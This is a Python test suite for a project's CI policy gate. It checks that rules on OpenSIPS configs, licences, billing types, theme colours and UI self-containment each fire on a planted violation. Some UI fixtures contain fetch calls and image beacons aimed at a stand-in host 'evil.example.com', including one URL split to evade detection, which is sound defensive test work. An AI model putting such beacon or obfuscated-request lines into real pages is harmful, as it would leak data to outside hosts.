#!/usr/bin/env python3
"""
Tests for the structural policy gate.

The point of these is narrow and important: prove that each rule in
ci/policy_check.py actually fires on the thing it claims to detect. A gate that
has only ever been observed passing is indistinguishable from a gate with a
typo in its regex, and this project's whole argument is that we do not ship
security controls on the assumption that they work.

Each test builds a throwaway repository containing one deliberate violation,
runs the real gate against it as a subprocess, and asserts both the exit code
and which rule fired.

Run: python ci/test_policy_check.py
"""

from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

GATE = Path(__file__).resolve().parent / "policy_check.py"


class GateFixture:
    """A minimal repository tree the gate can be pointed at."""

    def __init__(self, root: Path) -> None:
        self.root = root

    def write(self, relpath: str, content: str) -> None:
        path = self.root / relpath
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content, encoding="utf-8")

    def run(self) -> subprocess.CompletedProcess[str]:
        env = dict(os.environ, MEGATRON_REPO_ROOT=str(self.root))
        return subprocess.run(
            [sys.executable, str(GATE)],
            env=env, capture_output=True, text=True,
        )


class PolicyGateTest(unittest.TestCase):
    def fixture(self) -> GateFixture:
        tmp = tempfile.mkdtemp(prefix="megatron-gate-")
        self.addCleanup(lambda: __import__("shutil").rmtree(tmp, ignore_errors=True))
        return GateFixture(Path(tmp))

    # -- a tree with nothing wrong in it must pass -------------------------

    def test_clean_tree_passes(self) -> None:
        fx = self.fixture()
        fx.write("core/opensips/opensips.cfg",
                 'socket=udp:10.0.0.10:5060\n'
                 'route { route(relay); }\n'
                 'route[relay] { t_relay(); }\n')
        fx.write("edge/opensips/opensips.cfg",
                 'socket=udp:203.0.113.10:5060\n'
                 'modparam("permissions", "db_url", "")\n'
                 'route { drop; }\n')
        r = fx.run()
        self.assertEqual(r.returncode, 0, f"clean tree should pass:\n{r.stdout}")
        self.assertIn("PASS", r.stdout)

    # -- KAMAILIO-NAMES ----------------------------------------------------

    def test_kamailio_module_name_is_rejected(self) -> None:
        fx = self.fixture()
        fx.write("edge/opensips/opensips.cfg", 'loadmodule "htable.so"\n')
        r = fx.run()
        self.assertEqual(r.returncode, 1)
        self.assertIn("KAMAILIO-NAMES", r.stdout)
        self.assertIn("cachedb_local", r.stdout)

    def test_kamailio_function_name_is_rejected(self) -> None:
        fx = self.fixture()
        fx.write("edge/opensips/opensips.cfg", 'route { if (!sanity_check()) { drop; } }\n')
        r = fx.run()
        self.assertEqual(r.returncode, 1)
        self.assertIn("KAMAILIO-NAMES", r.stdout)

    def test_kamailio_name_inside_a_comment_is_ignored(self) -> None:
        """The configs explain at length why htable does not exist here. Prose
        about a trap must not itself trip the trap."""
        fx = self.fixture()
        fx.write("edge/opensips/opensips.cfg",
                 '# This is the OpenSIPS equivalent of Kamailio htable.so; there is no\n'
                 '# htable module and sanity_check() does not exist either.\n'
                 'loadmodule "cachedb_local.so"\n')
        r = fx.run()
        self.assertNotIn("KAMAILIO-NAMES", r.stdout)

    # -- EDGE-CREDENTIALS --------------------------------------------------

    def test_edge_with_a_real_db_url_is_rejected(self) -> None:
        fx = self.fixture()
        fx.write("edge/opensips/opensips.cfg",
                 'modparam("permissions", "db_url", "postgres://opensips@10.0.0.20/megatron")\n')
        r = fx.run()
        self.assertEqual(r.returncode, 1)
        self.assertIn("EDGE-CREDENTIALS", r.stdout)

    def test_edge_with_an_empty_db_url_is_accepted(self) -> None:
        fx = self.fixture()
        fx.write("edge/opensips/opensips.cfg", 'modparam("dispatcher", "db_url", "")\n')
        r = fx.run()
        self.assertNotIn("EDGE-CREDENTIALS", r.stdout)

    def test_edge_loading_a_db_driver_is_rejected(self) -> None:
        fx = self.fixture()
        fx.write("edge/opensips/opensips.cfg", 'loadmodule "db_postgres.so"\n')
        r = fx.run()
        self.assertEqual(r.returncode, 1)
        self.assertIn("EDGE-CREDENTIALS", r.stdout)

    # -- CORE-PRIVATE ------------------------------------------------------

    def test_core_binding_a_public_address_is_rejected(self) -> None:
        fx = self.fixture()
        fx.write("core/opensips/opensips.cfg", 'socket=udp:203.0.113.7:5060\n')
        r = fx.run()
        self.assertEqual(r.returncode, 1)
        self.assertIn("CORE-PRIVATE", r.stdout)

    def test_core_with_no_socket_line_is_rejected(self) -> None:
        """Omitting socket= makes OpenSIPS listen on every interface, which on a
        dual-homed core node means the public one."""
        fx = self.fixture()
        fx.write("core/opensips/opensips.cfg", 'log_level=2\n')
        r = fx.run()
        self.assertEqual(r.returncode, 1)
        self.assertIn("CORE-PRIVATE", r.stdout)

    def test_core_binding_rfc1918_is_accepted(self) -> None:
        fx = self.fixture()
        for addr in ("10.0.0.10", "172.16.4.9", "192.168.1.5", "127.0.0.1"):
            with self.subTest(addr=addr):
                fx.write("core/opensips/opensips.cfg", f"socket=udp:{addr}:5060\n")
                r = fx.run()
                self.assertNotIn("CORE-PRIVATE", r.stdout)

    def test_core_binding_172_32_is_rejected(self) -> None:
        """172.32/16 is public. The RFC1918 block is 172.16/12, and getting that
        boundary wrong is a classic way to believe an address is private."""
        fx = self.fixture()
        fx.write("core/opensips/opensips.cfg", 'socket=udp:172.32.0.1:5060\n')
        r = fx.run()
        self.assertEqual(r.returncode, 1)
        self.assertIn("CORE-PRIVATE", r.stdout)

    # -- ROUTE-TARGETS -----------------------------------------------------

    def test_call_to_undefined_route_is_rejected(self) -> None:
        fx = self.fixture()
        fx.write("core/opensips/opensips.cfg",
                 'socket=udp:10.0.0.10:5060\n'
                 'route { route(does_not_exist); }\n')
        r = fx.run()
        self.assertEqual(r.returncode, 1)
        self.assertIn("ROUTE-TARGETS", r.stdout)

    # -- NO-SHELL-OUT / MONEY-NOT-FLOAT ------------------------------------

    def test_runtime_exec_is_rejected(self) -> None:
        fx = self.fixture()
        fx.write("api/src/main/kotlin/Provision.kt",
                 'fun go() { Runtime.getRuntime().exec(cmd) }\n')
        r = fx.run()
        self.assertEqual(r.returncode, 1)
        self.assertIn("NO-SHELL-OUT", r.stdout)

    def test_float_in_a_billing_path_is_rejected(self) -> None:
        fx = self.fixture()
        fx.write("rating/src/main/kotlin/Tariff.kt", 'val rate: Double = 0.01\n')
        r = fx.run()
        self.assertEqual(r.returncode, 1)
        self.assertIn("MONEY-NOT-FLOAT", r.stdout)

    def test_float_outside_a_billing_path_is_allowed(self) -> None:
        """Latency histograms and load factors are legitimately floating point.
        The ban is about money, not about the type."""
        fx = self.fixture()
        fx.write("edge/agent/metrics.go", 'var loadFactor float64 = 0.75\n')
        r = fx.run()
        self.assertNotIn("MONEY-NOT-FLOAT", r.stdout)

    # -- LICENCE -----------------------------------------------------------

    def test_vendored_gpl_source_is_rejected(self) -> None:
        fx = self.fixture()
        fx.write("vendor/thing.c",
                 '/* SPDX-License-Identifier: GPL-2.0 */\nint main(void){return 0;}\n')
        r = fx.run()
        self.assertEqual(r.returncode, 1)
        self.assertIn("LICENCE", r.stdout)

    def test_vendored_agpl_and_lgpl_source_are_rejected(self) -> None:
        """AGPL and LGPL had no coverage at all: the whole LICENCE section
        only ever exercised the GPL path. Deleting AGPL and LGPL from
        COPYLEFT_MARKERS left the suite green -- and those are the two
        families that matter most here. CGRateS being AGPLv3 is the single
        biggest architectural constraint on this project (ARCHITECTURE.md 3),
        so the marker for it silently rotting is not a theoretical concern."""
        cases = {
            "agpl-spdx": "/* SPDX-License-Identifier: AGPL-3.0-only */\n",
            "lgpl-spdx": "/* SPDX-License-Identifier: LGPL-2.1 */\n",
            "agpl-fullname": "/* GNU AFFERO GENERAL PUBLIC LICENSE Version 3 */\n",
            "lgpl-fullname": "/* GNU LESSER GENERAL PUBLIC LICENSE Version 2.1 */\n",
        }
        for name, header in cases.items():
            with self.subTest(licence=name):
                fx = self.fixture()
                fx.write(f"vendor/{name}.c", header + "int main(void){return 0;}\n")
                r = fx.run()
                self.assertEqual(r.returncode, 1, r.stdout)
                self.assertIn("LICENCE", r.stdout)

    def test_core_binding_a_public_ipv6_address_is_rejected(self) -> None:
        """The entire IPv6 branch of CORE-PRIVATE had no coverage. Replacing
        it with `continue` -- accepting any address at all -- left all tests
        green. The core having no route from the internet is the single most
        important structural claim in the design; it must not depend on
        nobody having typed an IPv6 socket yet."""
        fx = self.fixture()
        fx.write("core/opensips/opensips.cfg",
                 "socket=udp:[2001:db8::1]:5060\n"
                 "route { route(relay); }\nroute[relay] { t_relay(); }\n")
        r = fx.run()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("CORE-PRIVATE", r.stdout)
        self.assertIn("2001:db8::1", r.stdout)

    def test_core_binding_private_ipv6_is_accepted(self) -> None:
        """Unique-local (fc00::/7) and loopback are the legitimate cases."""
        for addr in ("fd00::10", "fc00::10", "::1"):
            with self.subTest(addr=addr):
                fx = self.fixture()
                fx.write("core/opensips/opensips.cfg",
                         f"socket=udp:[{addr}]:5060\n"
                         "route { route(relay); }\nroute[relay] { t_relay(); }\n")
                r = fx.run()
                self.assertEqual(r.returncode, 0, r.stdout)

    # -- the Gradle dependency scanner -------------------------------------

    APPROVED = json.dumps({
        "allowed_licences": ["Apache-2.0", "MIT"],
        "forbidden_licences": ["GPL-3.0", "AGPL-3.0", "LGPL-2.1"],
        "dependencies": {
            "org.jetbrains.kotlin:kotlin-stdlib": {
                "licence": "Apache-2.0", "why": "language runtime"},
            "com.example:agpl-thing": {
                "licence": "AGPL-3.0", "why": "recorded so it can be refused"},
            "com.example:mystery": {"licence": "WTFPL", "why": "unclassified"},
            "com.example:unjustified": {"licence": "MIT"},
        },
    })

    def gradle(self, body: str, approved: str | None = None):
        fx = self.fixture()
        fx.write("ci/approved-dependencies.json",
                 self.APPROVED if approved is None else approved)
        fx.write("svc/build.gradle.kts", body)
        return fx.run()

    def test_approved_dependency_passes(self) -> None:
        r = self.gradle('dependencies {\n'
                        '  implementation("org.jetbrains.kotlin:kotlin-stdlib:2.0.21")\n'
                        '}\n')
        self.assertEqual(r.returncode, 0, r.stdout)
        self.assertIn("Gradle manifest", r.stdout)

    def test_unlisted_dependency_is_rejected(self) -> None:
        """The whole point. A dependency nobody approved is a licence nobody
        checked, and for a proprietary product distributed to licensees that
        is not a problem to find later -- it is a product that cannot ship."""
        r = self.gradle('dependencies {\n'
                        '  implementation("com.example:not-listed:1.0.0")\n'
                        '}\n')
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("LICENCE", r.stdout)
        self.assertIn("not-listed", r.stdout)

    def test_copyleft_dependency_is_rejected(self) -> None:
        r = self.gradle('dependencies {\n'
                        '  implementation("com.example:agpl-thing:1.0.0")\n'
                        '}\n')
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("AGPL-3.0", r.stdout)

    def test_unclassified_licence_is_rejected(self) -> None:
        """Neither allowed nor forbidden means nobody decided. Silence is not
        approval."""
        r = self.gradle('dependencies {\n'
                        '  implementation("com.example:mystery:1.0.0")\n'
                        '}\n')
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("neither on the allowed nor the forbidden list", r.stdout)

    def test_dependency_without_a_justification_is_rejected(self) -> None:
        r = self.gradle('dependencies {\n'
                        '  implementation("com.example:unjustified:1.0.0")\n'
                        '}\n')
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("no `why`", r.stdout)

    def test_dependency_the_scanner_cannot_read_is_rejected(self) -> None:
        """Version catalogs and BOMs are normal, and unreadable to a text
        scan. A scanner that ignores what it does not understand provides
        exactly as much protection as no scanner while looking like it
        provides some."""
        for label, body in (
                ("version catalog", 'dependencies {\n  implementation(libs.ktor.core)\n}\n'),
                ("variable", 'dependencies {\n  implementation(someDep)\n}\n'),
                ("platform BOM",
                 'dependencies {\n  implementation(platform("com.example:bom:1.0"))\n}\n')):
            with self.subTest(form=label):
                r = self.gradle(body)
                self.assertEqual(r.returncode, 1, r.stdout)
                self.assertIn("cannot read", r.stdout)

    def test_internal_module_dependency_needs_no_licence(self) -> None:
        """implementation(project(":rating")) is our own code. It must not be
        demanded in the approvals file, and must not read as unparseable."""
        r = self.gradle('dependencies {\n'
                        '  implementation(project(":rating"))\n'
                        '  implementation("org.jetbrains.kotlin:kotlin-stdlib:2.0.21")\n'
                        '}\n')
        self.assertEqual(r.returncode, 0, r.stdout)

    def test_commented_out_dependency_does_not_trip_the_scanner(self) -> None:
        """Prose and dead declarations must not fail the build -- the same
        trap this file has hit three times now."""
        r = self.gradle('dependencies {\n'
                        '  // implementation("com.example:not-listed:1.0.0")\n'
                        '  /* implementation("com.example:agpl-thing:1.0.0") */\n'
                        '  implementation("org.jetbrains.kotlin:kotlin-stdlib:2.0.21")\n'
                        '}\n')
        self.assertEqual(r.returncode, 0, r.stdout)

    def test_missing_approvals_file_fails_closed(self) -> None:
        fx = self.fixture()
        fx.write("svc/build.gradle.kts",
                 'dependencies {\n  implementation("org.jetbrains.kotlin:kotlin-stdlib:2.0.21")\n}\n')
        r = fx.run()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("approved-dependencies.json", r.stdout)

    def test_kdoc_explaining_the_money_rule_does_not_trip_it(self) -> None:
        """Money.kt's KDoc explains at length why a Double must never appear
        in a money path, and that explanation was flagged as a Double in a
        money path on its first run."""
        fx = self.fixture()
        fx.write("rating/src/main/kotlin/Money.kt",
                 "/**\n"
                 " * Money as integer micros.\n"
                 " * Floats are excluded: a Double cannot represent 0.1 exactly.\n"
                 " */\n"
                 "@JvmInline value class Micros(val value: Long)\n")
        r = fx.run()
        self.assertEqual(r.returncode, 0, r.stdout)

    def test_an_actual_float_in_a_money_path_is_still_caught(self) -> None:
        fx = self.fixture()
        fx.write("rating/src/main/kotlin/Tariff.kt", "val rate: Double = 0.01\n")
        r = fx.run()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("MONEY-NOT-FLOAT", r.stdout)

    def test_unscannable_dependency_manifest_is_rejected(self) -> None:
        """The gate must fail closed when the build grows a dependency surface it
        cannot yet inspect, rather than passing and creating the impression that
        dependencies were checked.

        Uses go.mod because build.gradle.kts now HAS a scanner — which is the
        rule working as designed: this test previously used Gradle, and adding
        the Kotlin rating module forced the scanner to be written before the
        build could go green. That is exactly the pressure it was built to
        apply. The next ecosystem to arrive (Go, for the node agent) gets the
        same treatment."""
        fx = self.fixture()
        fx.write("edge/agent/go.mod", "module megatron/agent\n\ngo 1.23\n")
        r = fx.run()
        self.assertEqual(r.returncode, 1)
        self.assertIn("LICENCE", r.stdout)
        self.assertIn("no scanner", r.stdout)

    # -- THEME-SYNC and PALETTE --------------------------------------------
    #
    # These two guard ui/tokens.css. Both rules exist because of mistakes
    # already made in this repository, not because of a style preference:
    # --mg-ink-faint shipped at 2.70:1 against --mg-ground, and the commit
    # that fixed it updated two of the three theme blocks.

    # A correct tokens.css in the same shape as the real one: four blocks, the
    # dark palette written twice. Every block is substitutable so a test can
    # mutate exactly one and nothing else -- which is the whole point, since
    # the bug being guarded against is one block differing from the others.
    GOOD_TOKENS = """:root {
%(root)s  --mg-radius: 3px;
  --mg-font-ui: system-ui, sans-serif;
}
@media (prefers-color-scheme: dark) {
  :root:not([data-theme="light"]) {
%(dark1)s  }
}
:root[data-theme="dark"] {
%(dark2)s}
:root[data-theme="light"] {
%(light)s}
"""

    DARK_BODY = """  --mg-ground: #0E1418; --mg-raised: #151D21; --mg-sunken: #0A0F12;
  --mg-ink: #E6EDEF; --mg-ink-muted: #9AABB3; --mg-ink-faint: #7C8C94;
  --mg-accent: #4A98D8;
  --mg-series-1: #4A98D8; --mg-series-2: #B87C2A;
  --mg-good: #48B57F; --mg-warning: #DDA63F; --mg-critical: #E4665F;
  --mg-good-bg: #12261D; --mg-warning-bg: #2A2113; --mg-critical-bg: #2C1717;
"""

    LIGHT_BODY = """  --mg-ground: #F5F7F7; --mg-raised: #FFFFFF; --mg-sunken: #ECEFEF;
  --mg-ink: #0F1719; --mg-ink-muted: #46545B; --mg-ink-faint: #5F6D74;
  --mg-accent: #26699F;
  --mg-series-1: #2C7CBF; --mg-series-2: #9A6614;
  --mg-good: #127A4E; --mg-warning: #8A5D00; --mg-critical: #BE302C;
  --mg-good-bg: #E2F1E9; --mg-warning-bg: #F6EEDC; --mg-critical-bg: #F8E5E4;
"""

    def tokens(self, *, root: str | None = None, dark1: str | None = None,
               dark2: str | None = None, light: str | None = None,
               light_all: str | None = None, dark_all: str | None = None) -> str:
        """Build a tokens.css. light_all/dark_all change every block of that
        mode at once (an intentional palette change); the per-block arguments
        change exactly one (a drift bug)."""
        light_body = light_all if light_all is not None else self.LIGHT_BODY
        dark_body = dark_all if dark_all is not None else self.DARK_BODY
        return self.GOOD_TOKENS % {
            "root": root if root is not None else light_body,
            "dark1": dark1 if dark1 is not None else dark_body,
            "dark2": dark2 if dark2 is not None else dark_body,
            "light": light if light is not None else light_body,
        }

    def with_tokens(self, css: str) -> subprocess.CompletedProcess[str]:
        fx = self.fixture()
        fx.write("ui/tokens.css", css)
        return fx.run()

    def test_correct_tokens_file_passes(self) -> None:
        r = self.with_tokens(self.tokens())
        self.assertEqual(r.returncode, 0, r.stdout)
        self.assertNotIn("THEME-SYNC", r.stdout)
        self.assertNotIn("PALETTE", r.stdout.split("note:")[0])

    def test_palette_rule_actually_runs_on_the_fixture(self) -> None:
        """Guards the guard. If the validator failed to import, or the CSS
        parser found nothing, every other test in this section would pass
        vacuously -- the exact failure mode these tests exist to prevent."""
        r = self.with_tokens(self.tokens())
        self.assertIn("chart series pass the categorical checks", r.stdout)

    def test_theme_block_drift_is_rejected(self) -> None:
        """The mistake that actually happened: one theme block updated, the
        others left stale."""
        stale = self.DARK_BODY.replace("--mg-ink-faint: #7C8C94", "--mg-ink-faint: #6A7A82")
        r = self.with_tokens(self.tokens(dark1=stale))
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("THEME-SYNC", r.stdout)
        self.assertIn("--mg-ink-faint", r.stdout)

    def test_explicit_light_diverging_from_root_is_rejected(self) -> None:
        drifted = self.LIGHT_BODY.replace("--mg-accent: #26699F", "--mg-accent: #1A4E7A")
        r = self.with_tokens(self.tokens(light=drifted))
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("THEME-SYNC", r.stdout)

    def test_missing_token_in_a_theme_block_is_rejected(self) -> None:
        """A token omitted from a theme block keeps the other theme's value --
        white-on-white, and only in one of the two dark code paths."""
        short = self.DARK_BODY.replace("--mg-ink-faint: #7C8C94;", "")
        r = self.with_tokens(self.tokens(dark_all=short))
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("THEME-SYNC", r.stdout)
        self.assertIn("--mg-ink-faint", r.stdout)

    def test_missing_theme_block_is_rejected(self) -> None:
        css = self.tokens()
        css = css[:css.index(':root[data-theme="light"]')]
        r = self.with_tokens(css)
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("THEME-SYNC", r.stdout)

    def test_illegible_ink_is_rejected(self) -> None:
        """The original --mg-ink-faint, restored as a fixture: 2.70:1 against
        --mg-ground while carrying 10px axis labels. Applied to every light
        block, so THEME-SYNC stays quiet and this can only be PALETTE firing."""
        bad = self.LIGHT_BODY.replace("--mg-ink-faint: #5F6D74", "--mg-ink-faint: #8B9AA0")
        r = self.with_tokens(self.tokens(light_all=bad))
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("PALETTE", r.stdout)
        self.assertIn("--mg-ink-faint", r.stdout)
        self.assertNotIn("THEME-SYNC", r.stdout)

    def test_colour_blind_series_collapse_is_rejected(self) -> None:
        """Red vs green as the two series: the pair a human picks by instinct
        and the pair a protanope cannot separate. On the shield dashboard that
        is exactly the difference between accepted and absorbed traffic."""
        bad = self.LIGHT_BODY.replace("--mg-series-1: #2C7CBF; --mg-series-2: #9A6614",
                                      "--mg-series-1: #C0392B; --mg-series-2: #2E8B57")
        r = self.with_tokens(self.tokens(light_all=bad))
        self.assertIn("PALETTE", r.stdout)
        self.assertIn("CVD separation", r.stdout)
        self.assertNotIn("THEME-SYNC", r.stdout)

    def test_series_wearing_a_status_colour_is_rejected(self) -> None:
        bad = self.LIGHT_BODY.replace("--mg-series-2: #9A6614", "--mg-series-2: #BE302C")
        r = self.with_tokens(self.tokens(light_all=bad))
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("PALETTE", r.stdout)
        self.assertIn("impersonates an alarm", r.stdout)

    # -- fail-closed: bypasses found by attacking the gate ------------------
    #
    # These came from running deliberately-bad stylesheets through the gate,
    # not from reading it. The first version caught all of them by accident or
    # not at all, and one was a clean fail-open.

    def test_deleting_the_series_tokens_does_not_silence_the_rule(self) -> None:
        """The real bypass. Remove --mg-series-*, and the whole categorical
        and colour-vision battery stops running while the gate still prints
        PASS. A gate that can be switched off by deletion is not a gate."""
        light = self.LIGHT_BODY.replace(
            "  --mg-series-1: #2C7CBF; --mg-series-2: #9A6614;\n", "")
        dark = self.DARK_BODY.replace(
            "  --mg-series-1: #4A98D8; --mg-series-2: #B87C2A;\n", "")
        r = self.with_tokens(self.tokens(light_all=light, dark_all=dark))
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("PALETTE", r.stdout)
        self.assertIn("--mg-series-", r.stdout)

    def test_unreadable_colour_forms_are_rejected_everywhere(self) -> None:
        """An illegible colour written in a form the hex regex cannot parse,
        applied CONSISTENTLY to every block so the sync check has nothing to
        object to. Each of these is valid CSS and renders the same 2.2:1 grey;
        each previously vanished from the measurement instead of failing it."""
        for value in ("#9AA",                       # 3-digit hex
                      "rgb(155, 170, 176)",         # function syntax
                      "silver",                     # named colour
                      "#8B9AA0 !important",         # trailing declaration flag
                      "var(--mg-line-strong)"):     # indirection
            with self.subTest(value=value):
                light = self.LIGHT_BODY.replace("--mg-ink-faint: #5F6D74",
                                                f"--mg-ink-faint: {value}")
                dark = self.DARK_BODY.replace("--mg-ink-faint: #7C8C94",
                                              f"--mg-ink-faint: {value}")
                r = self.with_tokens(self.tokens(light_all=light, dark_all=dark))
                self.assertEqual(r.returncode, 1, r.stdout)
                self.assertIn("--mg-ink-faint", r.stdout)
                # Must be caught by the rule that owns the property, not only
                # as a side effect of the sync check noticing an odd token.
                self.assertIn("PALETTE", r.stdout)

    def test_required_tokens_cannot_simply_be_removed(self) -> None:
        for token, light_decl, dark_decl in (
                ("--mg-accent", "--mg-accent: #26699F;", "--mg-accent: #4A98D8;"),
                ("--mg-sunken", "--mg-sunken: #ECEFEF;", "--mg-sunken: #0A0F12;"),
                ("--mg-critical", "--mg-critical: #BE302C;", "--mg-critical: #E4665F;")):
            with self.subTest(token=token):
                light = self.LIGHT_BODY.replace(light_decl, "")
                dark = self.DARK_BODY.replace(dark_decl, "")
                r = self.with_tokens(self.tokens(light_all=light, dark_all=dark))
                self.assertEqual(r.returncode, 1, r.stdout)
                self.assertIn(token, r.stdout)

    def test_absent_tokens_file_is_a_note_not_a_failure(self) -> None:
        """Most of the repository has no UI. The rule must stay quiet there
        rather than failing every tree that has not grown a design system."""
        fx = self.fixture()
        fx.write("edge/opensips/opensips.cfg", "route { drop; }\n")
        r = fx.run()
        self.assertEqual(r.returncode, 0, r.stdout)
        self.assertIn("not exercised", r.stdout)

    # -- UI-SELF-CONTAINED -------------------------------------------------

    def page(self, body: str) -> subprocess.CompletedProcess[str]:
        fx = self.fixture()
        fx.write("ui/tokens.css", self.tokens())
        fx.write("ui/shield/index.html", body)
        return fx.run()

    def test_cdn_reference_is_rejected(self) -> None:
        """The console ships on the edge node and is opened when things are
        already going wrong. A CDN there is an availability dependency on a
        third party mid-incident and a leak of who is under attack, when."""
        r = self.page('<script src="https://cdn.example.com/chart.js"></script>')
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("UI-SELF-CONTAINED", r.stdout)

    def test_protocol_relative_url_is_rejected(self) -> None:
        r = self.page('<link rel="stylesheet" href="//fonts.example.com/x.css">')
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("UI-SELF-CONTAINED", r.stdout)

    def test_relative_asset_is_allowed(self) -> None:
        r = self.page('<link rel="stylesheet" href="../tokens.css">')
        self.assertEqual(r.returncode, 0, r.stdout)

    def test_svg_namespace_is_not_an_external_request(self) -> None:
        """createElementNS requires the literal namespace URI and never
        fetches it. Flagging it would make the rule wrong in the one place
        every SVG-building page has to touch."""
        r = self.page('<script>const NS = "http://www.w3.org/2000/svg";</script>')
        self.assertEqual(r.returncode, 0, r.stdout)

    def test_hex_literal_outside_tokens_is_rejected(self) -> None:
        """A hex in a stylesheet is invisible to the PALETTE checks, which
        only ever read tokens.css. That is how an illegible colour gets in."""
        r = self.page("<style>.x { color: #8B9AA0; }</style>")
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("UI-SELF-CONTAINED", r.stdout)

    def test_colour_function_outside_tokens_is_rejected(self) -> None:
        r = self.page("<style>.x { box-shadow: 0 2px 8px rgba(0,0,0,.2); }</style>")
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("UI-SELF-CONTAINED", r.stdout)

    def test_token_reference_is_allowed(self) -> None:
        r = self.page("<style>.x { color: var(--mg-ink); }</style>")
        self.assertEqual(r.returncode, 0, r.stdout)

    def test_prose_about_colours_does_not_trip_the_rule(self) -> None:
        """The rule flagged this exact shape on its first ever run: the word
        rgba() inside the multi-line comment written to explain why the file
        avoids rgba(). Line-by-line comment stripping is not enough."""
        r = self.page("<style>\n"
                      "/* We do not use rgba() or #8B9AA0 here;\n"
                      "   this comment explains why, across lines. */\n"
                      ".x { color: var(--mg-ink); }\n"
                      "</style>\n"
                      "<!-- and an HTML comment mentioning #123456 too -->")
        self.assertEqual(r.returncode, 0, r.stdout)

    def test_element_ids_are_not_mistaken_for_hex_colours(self) -> None:
        """#chart-accepted and &#39; are not colours. A rule with false
        positives gets disabled, which costs more than it ever caught."""
        r = self.page("<style>#chart-accepted { color: var(--mg-ink); }</style>"
                      "<script>const s = '&#39;';</script>")
        self.assertEqual(r.returncode, 0, r.stdout)

    def test_non_canonical_selector_is_rejected(self) -> None:
        """The worst bypass found. This gate keys blocks by selector TEXT and
        has no model of the cascade, so a selector it does not recognise can
        win in the browser having never been measured. Both of these rendered
        an invisible --mg-ink-faint while the gate printed PASS."""
        for label, selector in (
                ("higher specificity", 'html:root[data-theme="dark"]'),
                ("same specificity, later in source", '[data-theme="dark"]:root'),
                ("class on the root", ':root.theme-dark')):
            with self.subTest(selector=label):
                css = self.tokens() + (
                    f"\n{selector} {{\n"
                    "  --mg-ink-faint: #14181B;\n"
                    "  --mg-series-1: #12181C;\n"
                    "}\n")
                r = self.with_tokens(css)
                self.assertEqual(r.returncode, 1, r.stdout)
                self.assertIn("THEME-SYNC", r.stdout)

    def test_unknown_asset_type_under_ui_fails_closed(self) -> None:
        """Matches the LICENCE rule's posture: a thing the browser can fetch
        but this rule cannot read must fail, not be skipped. Otherwise the
        rule is only as strong as the extension list somebody thought of."""
        fx = self.fixture()
        fx.write("ui/tokens.css", self.tokens())
        fx.write("ui/shield/index.html", '<link rel="icon" href="favicon.ico">')
        fx.write("ui/shield/favicon.ico", "not really an icon")
        r = fx.run()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("UI-SELF-CONTAINED", r.stdout)
        self.assertIn("no scanner", r.stdout)

    def test_tooling_beside_the_ui_is_not_treated_as_an_asset(self) -> None:
        """ui/validate_palette.py and ui/README.md live under ui/ and are
        never served. Failing on them would make the rule unusable."""
        fx = self.fixture()
        fx.write("ui/tokens.css", self.tokens())
        fx.write("ui/validate_palette.py", "CHROMA_FLOOR = 0.10\n")
        fx.write("ui/README.md", "# UI\n\nThe colour `#8B9AA0` is discussed here.\n")
        r = fx.run()
        self.assertEqual(r.returncode, 0, r.stdout)

    def test_fetch_must_name_a_same_origin_literal_path(self) -> None:
        """No regex recognises a URL the author split with `+`. So the rule
        requires the good shape instead of hunting the bad one: a literal
        starting with '/'. Concatenation is then a violation on its face,
        whatever it evaluates to."""
        bad = (
            '<script>const u = "ht" + "tps://evil.example.com/x"; fetch(u);</script>',
            '<script>fetch(`https://evil.example.com/${x}`);</script>',
            '<script>fetch(endpoint);</script>',
            '<script>fetch(new URL("/v1/overview", base));</script>',
        )
        for body in bad:
            with self.subTest(body=body):
                r = self.page(body)
                self.assertEqual(r.returncode, 1, r.stdout)
                self.assertIn("UI-SELF-CONTAINED", r.stdout)

    def test_same_origin_literal_fetch_is_allowed(self) -> None:
        r = self.page('<script>fetch("/v1/overview?window=1h");</script>')
        self.assertEqual(r.returncode, 0, r.stdout)

    def test_other_request_channels_are_rejected(self) -> None:
        for body in ('<script>new WebSocket("wss://x.example");</script>',
                     '<script>new EventSource("/v1/stream");</script>',
                     '<script>navigator.sendBeacon("/x", d);</script>',
                     '<script>const r = new XMLHttpRequest();</script>'):
            with self.subTest(body=body):
                r = self.page(body)
                self.assertEqual(r.returncode, 1, r.stdout)

    def test_url_split_across_a_literal_newline_is_caught(self) -> None:
        """HTML attribute values may contain newlines. A per-line scan saw
        'https://' with nothing after it, then a hostname with no scheme."""
        r = self.page('<img src="https://\nevil.example.com/beacon.png">')
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("UI-SELF-CONTAINED", r.stdout)

    def test_a_second_stylesheet_may_not_declare_tokens(self) -> None:
        """The worst round-2 bypass, and it needed no exotic syntax at all: an
        ordinary second stylesheet, linked after tokens.css, redeclaring a
        token with pure var() indirection. No hex and no colour function, so
        UI-SELF-CONTAINED saw nothing; a different file, so THEME-SYNC and
        PALETTE never opened it. In the browser the later sheet wins, and ink
        renders invisible on its own background while every rule says PASS."""
        fx = self.fixture()
        fx.write("ui/tokens.css", self.tokens())
        fx.write("ui/shield/theme-override.css",
                 ':root[data-theme="dark"] {\n'
                 "  --mg-ink-faint: var(--mg-ground);\n"
                 "  --mg-series-1: var(--mg-ground);\n}\n")
        r = fx.run()
        self.assertEqual(r.returncode, 1, r.stdout)
